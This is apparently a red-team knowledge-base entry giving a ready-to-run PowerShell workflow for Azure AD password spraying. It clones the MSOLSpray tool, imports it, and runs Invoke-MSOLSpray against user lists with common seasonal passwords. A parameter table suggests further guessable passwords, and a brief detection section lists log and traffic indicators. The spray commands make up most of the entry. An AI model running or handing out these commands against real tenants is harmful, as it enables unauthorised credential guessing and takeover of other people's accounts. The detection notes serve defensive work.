---
id: 8c000206-e071-4abf-817c-f494946c91a9
name: mso-lspray-complete-usage-script
type: code
language: powershell
verified: true
created_at: '2023-05-23T16:38:53.035925+00:00'
updated_at: '2023-05-23T16:38:53.082017+00:00'
platforms:
  - Windows
  - Linux
tags:
  - password-spray
  - azure-ad
  - powershell
validated: true
---

# mso-lspray-complete-usage-script

## Code

```powershell
git clone https://github.com/dafthack/MSOLSpray
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
```

## Description

This script provides the complete workflow for setting up and executing an Azure AD password spray using MSOLSpray, from cloning the repo to running multiple spray attempts with different passwords.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| .\userlist.txt | Path to first user list file | .\users.txt |
| Winter2020 | First password to test | Summer2023 |
| .\users.txt | Path to second user list file | .\targets.txt |
| d0ntSprayme! | Second password to test | P@ssw0rd123 |

## Usage

Run this in a terminal with Git and PowerShell available. First line requires Git; subsequent lines are PowerShell. Use after preparing user lists. Ideal for automated red team password testing in Azure environments.

## Detection

- PowerShell module imports and unusual Invoke-MSOLSpray executions in logs.
- Spike in failed Azure AD logins from a single source IP.
- Network traffic to login.microsoftonline.com with credential patterns.

## Related

- [[procedures/Azure-AD-Password-Spray]]
